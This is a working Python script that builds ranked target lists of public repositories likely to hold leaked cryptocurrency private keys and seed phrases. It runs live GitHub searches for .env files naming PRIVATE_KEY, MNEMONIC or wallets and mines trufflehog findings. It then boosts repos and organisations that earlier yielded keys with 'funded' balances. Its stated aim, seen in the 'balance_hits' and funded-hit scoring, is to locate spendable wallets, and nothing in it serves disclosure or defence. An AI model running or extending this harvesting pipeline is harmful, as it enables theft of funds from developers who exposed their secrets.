#!/usr/bin/env python3
"""Production target generator — live only, no placeholders, no cartesian fiction.

Builds a tight hot queue from:
  1) Live GitHub code search (P0 secret-density queries)
  2) Repos/orgs extracted from real trufflehog + scanner findings
  3) Neighbors of sources that already produced verified keys

Every URI is filtered against FAKE patterns. Optional live probe for HTTP targets.
Writes:
  - ~/paste_box.txt  (GENERATED block, capped)
  - ~/targets/targets_<platform>.txt  (cleaned, real only)
  - ~/.hot_targets.json  (scored queue snapshot)
"""
from __future__ import annotations

import json
import os
import re
import sys
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import quote_plus

try:
    import requests
except ImportError:
    raise SystemExit("[!] requests required: pip3 install requests")

HOME = Path.home()
PASTE_BOX = HOME / "paste_box.txt"
TARGETS_DIR = HOME / "targets"
HOT_FILE = HOME / ".hot_targets.json"
MEMORY_FILE = HOME / "crypto_scanner_memory.jsonl"
HIGH_CONF = HOME / "high_confidence_hits.jsonl"
TRUFFLEHOG = HOME / ".trufflehog_results.jsonl"
TRUFFLEHOG_MASS = HOME / ".trufflehog_mass_results.jsonl"
LEARN_FILE = HOME / "learn_findings.jsonl"
SCORES_FILE = HOME / ".target_scores.json"

BEGIN_MARKER = "# === BEGIN GENERATED TARGETS ==="
END_MARKER = "# === END GENERATED TARGETS ==="

# Hard cap — quality over volume
MAX_HOT = int(os.environ.get("HOT_TARGET_CAP", "500"))
MAX_PER_PLATFORM = {
    "github": 350,
    "gitlab": 40,
    "huggingface": 30,
    "docker": 20,
    "gist": 40,
    "other": 20,
}

FAKE_RE = re.compile(
    r"placeholder|example\.com|example\.org|my-bucket|myuser|myimage|my-team|"
    r"my-workspace|my-jenkins|my-job|localhost|127\.0\.0\.1|0\.0\.0\.0|"
    r"your[-_]|xxx|dummy|test-bucket|public-dataset-placeholder|"
    r"public-bucket-placeholder|es-\d+\.example|logs-\d+\.example|"
    r"jenkins\.example|postman://(?:workspace|collection)/[\w-]+-\d{4}|"
    r"github://google/awesome|todo|fixme|changeme",
    re.I,
)

GITHUB_URL_RE = re.compile(
    r"https?://(?:www\.)?github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+?)(?:\.git)?(?:[/?#]|$)"
)
GITLAB_URL_RE = re.compile(
    r"https?://(?:www\.)?gitlab\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+?)(?:\.git)?(?:[/?#]|$)"
)
HF_URL_RE = re.compile(
    r"https?://(?:www\.)?huggingface\.co/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)"
)
GIST_RE = re.compile(r"https?://gist\.github\.com/([A-Za-z0-9_.-]+)/([a-f0-9]+)")

# Live high-signal GitHub code search (production)
P0_QUERIES = [
    'filename:.env PRIVATE_KEY',
    'filename:.env MNEMONIC',
    'filename:.env "SEED_PHRASE"',
    'filename:.env WALLET',
    'filename:.env "0x" path:.env',
    'extension:json path:keystore',
    'filename:docker-compose.yml PRIVATE_KEY',
    'filename:docker-compose.yaml MNEMONIC',
    'filename:.env.local PRIVATE',
    'filename:secrets.json private',
    'filename:wallet.json',
    '"BEGIN RSA PRIVATE KEY" extension:pem',
    'filename:.env BTC_',
    'filename:.env ETH_PRIVATE',
    'path:config filename:.env mnemonic',
]

P1_QUERIES = [
    'filename:.env.example PRIVATE_KEY',  # often copy-pasted real values
    'extension:env PRIVATE_KEY',
    'filename:local.env',
    'filename:production.env PRIVATE',
    '"bip39" filename:.env',
    '"12 words" wallet',
]


def load_adaptive_queries():
    """Merge success-atlas queries (from real funded hits) ahead of static P0/P1."""
    p0 = list(P0_QUERIES)
    p1 = list(P1_QUERIES)
    aq_path = HOME / ".adaptive_queries.json"
    boost_repos = []
    boost_orgs = []
    try:
        if aq_path.exists():
            data = json.loads(aq_path.read_text(encoding="utf-8"))
            ap0 = [q for q in (data.get("p0") or []) if isinstance(q, str) and q.strip()]
            ap1 = [q for q in (data.get("p1") or []) if isinstance(q, str) and q.strip()]
            # Adaptive first, then static fillers not already present
            seen = set()
            merged_p0 = []
            for q in ap0 + p0:
                if q not in seen:
                    seen.add(q)
                    merged_p0.append(q)
            merged_p1 = []
            for q in ap1 + p1:
                if q not in seen:
                    seen.add(q)
                    merged_p1.append(q)
            p0, p1 = merged_p0, merged_p1
            boost_repos = list(data.get("boost_repos") or [])
            boost_orgs = list(data.get("boost_orgs") or [])
            print(f"  [adapt] loaded {len(ap0)} p0 + {len(ap1)} p1 atlas queries, "
                  f"{len(boost_repos)} boost repos, {len(boost_orgs)} orgs")
    except Exception as e:
        print(f"  [adapt] query load skipped: {e}")
    return p0, p1, boost_repos, boost_orgs



def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def is_fake(uri: str) -> bool:
    if not uri or not str(uri).strip():
        return True
    u = str(uri).strip()
    if u.startswith("#"):
        return True
    if FAKE_RE.search(u):
        return True
    # cartesian-style scheme fakes from old generator
    if re.match(r"^(github|gitlab|huggingface|docker|circleci|postman|jenkins|elasticsearch|syslog)://", u):
        # allow only if looks like a real path with no placeholder digits spam
        if "placeholder" in u.lower() or re.search(r"-\d{4}$", u):
            return True
        # bare scheme targets without real host are low value — drop docker://ubuntu:latest spam unless explicit allow
        if u.startswith(("docker://", "circleci://", "postman://", "jenkins://",
                         "elasticsearch://", "syslog://", "s3://", "gs://")):
            return True
    if u.startswith("s3://public-dataset") or u.startswith("gs://public-bucket"):
        return True
    return False


def load_github_token() -> str:
    env = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN") or ""
    if env.strip():
        return env.strip()
    for path in (HOME / ".github_token", HOME / ".env"):
        if not path.exists():
            continue
        text = path.read_text(encoding="utf-8", errors="ignore")
        if path.name == ".github_token":
            tok = text.strip().splitlines()[0].strip() if text.strip() else ""
            if tok:
                return tok
        for line in text.splitlines():
            if line.strip().startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            if k.strip() in ("GITHUB_TOKEN", "GH_TOKEN"):
                return v.strip().strip('"').strip("'")
    return ""


def load_jsonl(path: Path, limit: int = 0) -> List[dict]:
    rows = []
    if not path.exists():
        return rows
    with path.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                rows.append(json.loads(line))
            except Exception:
                continue
            if limit and len(rows) >= limit:
                break
    return rows


def normalize_github(owner: str, repo: str) -> Optional[str]:
    owner = (owner or "").strip().strip("/")
    repo = (repo or "").strip().strip("/").removesuffix(".git")
    if not owner or not repo:
        return None
    if owner.lower() in {"about", "settings", "marketplace", "orgs", "users", "search", "topics"}:
        return None
    if FAKE_RE.search(f"{owner}/{repo}"):
        return None
    return f"https://github.com/{owner}/{repo}"


def extract_uris_from_text(text: str) -> List[Tuple[str, str]]:
    """Return list of (platform, uri)."""
    out: List[Tuple[str, str]] = []
    if not text:
        return out
    for m in GITHUB_URL_RE.finditer(text):
        u = normalize_github(m.group(1), m.group(2))
        if u:
            out.append(("github", u))
    for m in GIST_RE.finditer(text):
        out.append(("gist", m.group(0).split("#")[0]))
    for m in GITLAB_URL_RE.finditer(text):
        out.append(("gitlab", f"https://gitlab.com/{m.group(1)}/{m.group(2).removesuffix('.git')}"))
    for m in HF_URL_RE.finditer(text):
        out.append(("huggingface", f"https://huggingface.co/{m.group(1)}/{m.group(2)}"))
    return out


def extract_from_trufflehog_record(rec: dict) -> List[Tuple[str, str, float]]:
    """Extract (platform, uri, base_score) from a trufflehog-like record."""
    found: List[Tuple[str, str, float]] = []
    blob_parts = []
    for k in ("repository", "repo", "url", "link", "SourceName", "source"):
        if rec.get(k):
            blob_parts.append(str(rec[k]))
    sm = rec.get("SourceMetadata") or {}
    data = sm.get("Data") if isinstance(sm, dict) else {}
    if isinstance(data, dict):
        for key in ("Github", "Git", "Gitlab", "Filesystem"):
            node = data.get(key) or {}
            if isinstance(node, dict):
                for kk in ("repository", "repo", "link", "file"):
                    if node.get(kk):
                        blob_parts.append(str(node[kk]))
    # classic format often only has path/commit — still mine stringsFound/diff for nested urls
    for k in ("path", "commit", "diff", "printDiff", "reason"):
        if rec.get(k):
            blob_parts.append(str(rec[k])[:2000])
    sf = rec.get("stringsFound") or rec.get("Raw") or rec.get("RawV2")
    if isinstance(sf, list):
        blob_parts.extend(str(x)[:500] for x in sf[:20])
    elif sf:
        blob_parts.append(str(sf)[:2000])

    blob = "\n".join(blob_parts)
    reason = str(rec.get("reason") or rec.get("DetectorName") or "").lower()
    verified = bool(rec.get("Verified") or rec.get("verified"))
    base = 0.35
    if verified:
        base += 0.4
    if any(x in reason for x in ("private key", "secret", "aws", "github", "mnemonic", "wallet", "password")):
        base += 0.15
    if "high entropy" in reason:
        base += 0.02  # weak alone

    for platform, uri in extract_uris_from_text(blob):
        if not is_fake(uri):
            found.append((platform, uri, base))

    # filesystem path sometimes embeds org/repo in CI checkout paths
    path = str(rec.get("path") or "")
    m = re.search(r"github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)", path)
    if m:
        u = normalize_github(m.group(1), m.group(2))
        if u:
            found.append(("github", u, base))
    return found


def extract_from_scanner_memory() -> List[Tuple[str, str, float]]:
    found = []
    for path in (MEMORY_FILE, HIGH_CONF):
        for rec in load_jsonl(path, limit=5000):
            src = rec.get("source") or rec.get("source_uri") or ""
            platform = (rec.get("platform") or "unknown").lower()
            findings = rec.get("findings") or {}
            wallet = findings.get("wallet") or {}
            has_key = bool(
                wallet.get("wifs")
                or wallet.get("hex_keys")
                or wallet.get("seed_phrases")
                or findings.get("wif")
                or findings.get("hex_key")
                or findings.get("seed_phrase")
            )
            conf = str(findings.get("confidence") or "").lower()
            score = 0.2
            if has_key:
                score = 0.85 if conf == "high" else 0.65
            if src and not is_fake(str(src)):
                # normalize platform from uri if needed
                for p, u in extract_uris_from_text(str(src)):
                    found.append((p, u, score))
                if str(src).startswith("http") and "github.com" in str(src):
                    found.append(("github", str(src).split("#")[0], score))
            # also mine source_line
            for p, u in extract_uris_from_text(str(rec.get("source_line") or "")):
                found.append((p, u, score * 0.8))
            raw = rec.get("raw_source") or {}
            if isinstance(raw, dict):
                for p, u, s in extract_from_trufflehog_record(raw):
                    found.append((p, u, max(s, score)))
    return found


def load_winning_orgs() -> Set[str]:
    """Orgs/repos that produced wallet material — expand neighbors."""
    orgs: Set[str] = set()
    for platform, uri, score in extract_from_scanner_memory():
        if score < 0.5:
            continue
        m = GITHUB_URL_RE.search(uri or "")
        if m:
            orgs.add(m.group(1).lower())
    # also from scores file if outcome-tagged
    if SCORES_FILE.exists():
        try:
            data = json.loads(SCORES_FILE.read_text())
            for _h, row in data.items():
                if not isinstance(row, dict):
                    continue
                if float(row.get("key_hits", 0) or 0) > 0 or float(row.get("balance_hits", 0) or 0) > 0:
                    uri = row.get("uri") or ""
                    m = GITHUB_URL_RE.search(uri)
                    if m:
                        orgs.add(m.group(1).lower())
        except Exception:
            pass
    return orgs


def github_api_get(url: str, token: str, params: Optional[dict] = None) -> Optional[dict]:
    headers = {
        "Accept": "application/vnd.github+json",
        "User-Agent": "RepoHere1-TargetGen/3.0",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        r = requests.get(url, headers=headers, params=params or {}, timeout=25)
        if r.status_code == 403 and "rate limit" in r.text.lower():
            print(f"  [!] GitHub rate limit: {url}", flush=True)
            return None
        if r.status_code == 422:
            return None
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print(f"  [!] GitHub API error: {e}", flush=True)
        return None


def live_github_search(token: str, max_results: int = 300) -> List[Tuple[str, str, float]]:
    """Live code search → unique repos. Requires token for useful rate limits."""
    if not token:
        print("  [!] No GITHUB_TOKEN — skipping live code search", flush=True)
        return []

    found: Dict[str, float] = {}
    # Prefer recently pushed material via repo search (faster + more reliable than code search)
    since = (datetime.now(timezone.utc) - timedelta(days=90)).strftime("%Y-%m-%d")
    # Adaptive queries from success atlas (funded eth/matic paths) + static fallbacks
    adapt_p0, adapt_p1, boost_repos, boost_orgs = load_adaptive_queries()
    queries = list(adapt_p0[:8])  # more adaptive code searches

    # 1) Repository search (works with basic token scopes, faster)
    repo_queries = [
        f"wallet filename:.env pushed:>{since}",
        f"PRIVATE_KEY filename:.env pushed:>{since}",
        f"MNEMONIC filename:.env pushed:>{since}",
        f"hardhat PRIVATE_KEY pushed:>{since}",
        "bip39 mnemonic",
        "ethereum keystore",
        "peggy bridge wallet",
    ]
    for qi, q in enumerate(repo_queries):
        if len(found) >= max_results:
            break
        print(f"  [live] repo-search [{qi+1}/{len(repo_queries)}]: {q[:70]}", flush=True)
        data = github_api_get(
            "https://api.github.com/search/repositories",
            token,
            params={"q": q, "sort": "updated", "order": "desc", "per_page": 30},
        )
        if not data:
            time.sleep(0.2)
            continue
        for repo in data.get("items") or []:
            html = repo.get("html_url") or ""
            if not html or is_fake(html):
                continue
            stars = int(repo.get("stargazers_count") or 0)
            score = 0.85
            if stars < 50:
                score += 0.08
            elif stars > 5000:
                score -= 0.05
            found[html] = max(found.get(html, 0), score)
        time.sleep(0.25)

    # 2) Code search (higher precision) — fewer queries
    for qi, q in enumerate(queries):
        if len(found) >= max_results:
            break
        print(f"  [live] code-search [{qi+1}/{len(queries)}]: {q[:70]}", flush=True)
        data = github_api_get(
            "https://api.github.com/search/code",
            token,
            params={"q": q, "per_page": 25},
        )
        if not data:
            time.sleep(0.3)
            continue
        items = data.get("items") or []
        for it in items:
            repo = (it.get("repository") or {})
            full = repo.get("full_name") or ""
            html = repo.get("html_url") or (f"https://github.com/{full}" if full else "")
            if not html or is_fake(html):
                continue
            stars = int(repo.get("stargazers_count") or 0)
            score = 0.95
            if stars < 50:
                score += 0.05
            found[html] = max(found.get(html, 0), score)
        time.sleep(0.4)

    # Expand winning orgs: list their recently pushed repos
    winners = set(load_winning_orgs()) | set(boost_orgs or [])
    # Prefer atlas orgs first
    ordered_orgs = list(boost_orgs or []) + [o for o in sorted(winners) if o not in set(boost_orgs or [])]
    for org in ordered_orgs[:20]:
        if len(found) >= max_results:
            break
        print(f"  [live] expand winning org: {org}", flush=True)
        data = github_api_get(
            f"https://api.github.com/users/{org}/repos",
            token,
            params={"sort": "pushed", "per_page": 15, "type": "all"},
        )
        if isinstance(data, list):
            for repo in data:
                html = repo.get("html_url") or ""
                if html and not is_fake(html):
                    found[html] = max(found.get(html, 0), 0.75)
        time.sleep(0.3)

    # Force-include repos that previously attributed to funded balances
    for html in (boost_repos or [])[:40]:
        if html and not is_fake(html):
            found[html] = max(found.get(html, 0), 0.98)
    # Extra adaptive p1 code searches if headroom
    for qi, q in enumerate(list(adapt_p1)[:6]):
        if len(found) >= max_results:
            break
        print(f"  [live] adapt-p1 code-search [{qi+1}]: {q[:70]}", flush=True)
        data = github_api_get(
            "https://api.github.com/search/code",
            token,
            params={"q": q, "per_page": 20},
        )
        if not data:
            time.sleep(0.3)
            continue
        for it in data.get("items") or []:
            repo = (it.get("repository") or {})
            full = repo.get("full_name") or ""
            html = repo.get("html_url") or (f"https://github.com/{full}" if full else "")
            if html and not is_fake(html):
                found[html] = max(found.get(html, 0), 0.92)
        time.sleep(0.4)
    return [("github", u, s) for u, s in found.items()]



def mine_local_findings() -> List[Tuple[str, str, float]]:
    found: List[Tuple[str, str, float]] = []
    found.extend(extract_from_scanner_memory())
    # tail large trufflehog files — last N lines only for speed
    for path, limit in ((TRUFFLEHOG, 3000), (TRUFFLEHOG_MASS, 2000)):
        if not path.exists():
            continue
        print(f"  [mine] {path.name} (last ~{limit} lines)", flush=True)
        try:
            # efficient tail
            data = path.read_bytes()
            if len(data) > 8_000_000:
                data = data[-8_000_000:]
            text = data.decode("utf-8", errors="ignore")
            lines = text.splitlines()[-limit:]
            for line in lines:
                try:
                    rec = json.loads(line)
                    found.extend(extract_from_trufflehog_record(rec))
                except Exception:
                    for platform, uri in extract_uris_from_text(line):
                        found.append((platform, uri, 0.25))
        except Exception as e:
            print(f"  [!] mine error {path.name}: {e}", flush=True)
    return found


def probe_github_exists(uri: str, token: str) -> bool:
    m = GITHUB_URL_RE.search(uri)
    if not m:
        return not is_fake(uri)
    owner, repo = m.group(1), m.group(2)
    headers = {"User-Agent": "RepoHere1-TargetGen/3.0", "Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        r = requests.get(
            f"https://api.github.com/repos/{owner}/{repo}",
            headers=headers,
            timeout=12,
        )
        return r.status_code == 200
    except Exception:
        return True  # don't drop on transient network


def merge_score(bucket: Dict[str, dict], platform: str, uri: str, score: float, origin: str) -> None:
    if is_fake(uri):
        return
    uri = uri.strip().rstrip("/")
    # normalize github
    m = GITHUB_URL_RE.search(uri)
    if m:
        uri = f"https://github.com/{m.group(1)}/{m.group(2).removesuffix('.git')}"
        platform = "github"
    row = bucket.get(uri)
    if not row:
        bucket[uri] = {
            "uri": uri,
            "platform": platform,
            "score": float(score),
            "origins": [origin],
        }
    else:
        row["score"] = max(float(row["score"]), float(score)) + 0.02  # multi-source bump
        if origin not in row["origins"]:
            row["origins"].append(origin)


def select_hot(bucket: Dict[str, dict]) -> List[dict]:
    items = sorted(bucket.values(), key=lambda r: -float(r["score"]))
    selected: List[dict] = []
    per: Dict[str, int] = {}
    for row in items:
        p = row["platform"]
        if per.get(p, 0) >= MAX_PER_PLATFORM.get(p, MAX_PER_PLATFORM["other"]):
            continue
        selected.append(row)
        per[p] = per.get(p, 0) + 1
        if len(selected) >= MAX_HOT:
            break
    return selected


def write_platform_files(selected: List[dict]) -> None:
    TARGETS_DIR.mkdir(parents=True, exist_ok=True)
    by_p: Dict[str, List[str]] = {}
    for row in selected:
        by_p.setdefault(row["platform"], []).append(row["uri"])

    # Always rewrite known platform files — empty if none (purges placeholders)
    all_platforms = [
        "github", "gitlab", "huggingface", "docker", "circleci", "postman",
        "s3", "gcs", "jenkins", "elasticsearch", "syslog", "gist",
    ]
    name_map = {
        "aws_s3": "s3",
        "s3": "s3",
        "github": "github",
        "gitlab": "gitlab",
        "huggingface": "hf",
        "docker": "docker",
        "circleci": "circleci",
        "postman": "postman",
        "gcs": "gcs",
        "jenkins": "jenkins",
        "elasticsearch": "elasticsearch",
        "syslog": "syslog",
        "gist": "github",  # gists go with github file too
    }
    # purge + write
    written = set()
    for platform, uris in by_p.items():
        fname = name_map.get(platform, platform)
        path = TARGETS_DIR / f"targets_{fname}.txt"
        # Overwrite with this run's live/selected URIs only (never re-merge old junk).
        merged = []
        seen = set()
        for u in uris:
            if u not in seen and not is_fake(u):
                seen.add(u)
                merged.append(u)
        header = [
            f"# production targets — {fname} — generated {utc_now()}",
            f"# real URIs only; placeholders purged",
        ]
        path.write_text("\n".join(header + merged) + "\n", encoding="utf-8")
        written.add(fname)
        print(f"  [write] {path.name}: {len(merged)} real targets")

    # Explicitly wipe known-fake-only platforms if empty
    for fname in ("s3", "gcs", "elasticsearch", "jenkins", "syslog", "postman", "circleci"):
        if fname in written:
            continue
        path = TARGETS_DIR / f"targets_{fname}.txt"
        path.write_text(
            f"# production targets — {fname} — generated {utc_now()}\n"
            f"# no live-verified targets; placeholders purged\n",
            encoding="utf-8",
        )
        print(f"  [purge] {path.name}: placeholders removed")


def update_paste_box(selected: List[dict]) -> None:
    lines: List[str] = []
    if PASTE_BOX.exists():
        lines = PASTE_BOX.read_text(encoding="utf-8", errors="ignore").splitlines()

    begin_idx = end_idx = None
    for i, line in enumerate(lines):
        if line.strip() == BEGIN_MARKER:
            begin_idx = i
        elif line.strip() == END_MARKER and begin_idx is not None:
            end_idx = i
            break

    by_p: Dict[str, List[str]] = {}
    for row in selected:
        by_p.setdefault(row["platform"], []).append(row["uri"])

    block = [
        BEGIN_MARKER,
        f"# LIVE production targets @ {utc_now()} — no placeholders — cap {MAX_HOT}",
        f"# scored hot queue ({len(selected)} uris)",
    ]
    for platform in sorted(by_p.keys(), key=lambda p: -len(by_p[p])):
        uris = by_p[platform]
        block.append(f"# --- {platform}: {len(uris)} targets ---")
        block.extend(uris)
    block.append(END_MARKER)

    # Strip any leftover fake lines outside markers too (aggressive clean of old junk)
    def clean_line(ln: str) -> bool:
        s = ln.strip()
        if not s or s.startswith("#"):
            return True
        return not is_fake(s)

    if begin_idx is not None and end_idx is not None:
        head = [ln for ln in lines[:begin_idx] if clean_line(ln)]
        tail = [ln for ln in lines[end_idx + 1 :] if clean_line(ln)]
        new_lines = head + block + tail
    else:
        head = [ln for ln in lines if clean_line(ln)]
        new_lines = head + ([""] if head else []) + block

    PASTE_BOX.write_text("\n".join(new_lines) + "\n", encoding="utf-8")
    print(f"  [write] {PASTE_BOX} ({len(selected)} hot targets in GENERATED block)")


def main() -> int:
    print("[+] Production target generator (live, no fakes)")
    token = load_github_token()
    print(f"  GitHub token: {'yes' if token else 'NO — live search degraded'}")

    bucket: Dict[str, dict] = {}

    print("[1/3] Mining local verified findings...")
    for platform, uri, score in mine_local_findings():
        merge_score(bucket, platform, uri, score, "local_findings")
    print(f"  bucket size after mine: {len(bucket)}")

    print("[2/3] Live GitHub high-signal search...")
    for platform, uri, score in live_github_search(token, max_results=MAX_HOT):
        merge_score(bucket, platform, uri, score, "live_github_search")
    print(f"  bucket size after live: {len(bucket)}")

    # Optional existence probe on top candidates (github only, sample)
    print("[3/3] Selecting hot queue (no slow probe)...")
    selected = select_hot(bucket)

    # Persist snapshot
    snap = {
        "generated_at": utc_now(),
        "count": len(selected),
        "targets": selected,
    }
    HOT_FILE.write_text(json.dumps(snap, indent=2), encoding="utf-8")

    write_platform_files(selected)
    update_paste_box(selected)

    print("\n[+] Hot queue ready:")
    by_p: Dict[str, int] = {}
    for r in selected:
        by_p[r["platform"]] = by_p.get(r["platform"], 0) + 1
    for p, c in sorted(by_p.items(), key=lambda x: -x[1]):
        print(f"  {p}: {c}")
    print(f"  total: {len(selected)} (cap {MAX_HOT})")
    if selected:
        print("  top 5:")
        for r in selected[:5]:
            print(f"    {r['score']:.3f}  {r['uri']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
